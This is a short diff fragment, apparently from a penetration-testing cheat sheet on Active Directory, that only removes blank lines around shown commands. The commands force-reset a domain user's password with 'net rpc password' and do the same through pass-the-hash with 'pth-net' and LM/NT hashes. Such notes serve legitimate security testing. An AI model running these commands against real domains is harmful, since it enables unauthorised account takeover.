@@ -4,13 +4,11 @@
 net rpc password jamie -U domain.local/john -S 192.168.210.10
 net rpc password TargetUser -U <domain/your_user> -S <dc>
 ````
-
 #### Pass the Hash
 
 ```bash
 pth-net rpc password 'TargetUser' "NewPassword" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
 ```
-
 #### PowerShell from another account if the Source Account Password is Known
 
 ````bash
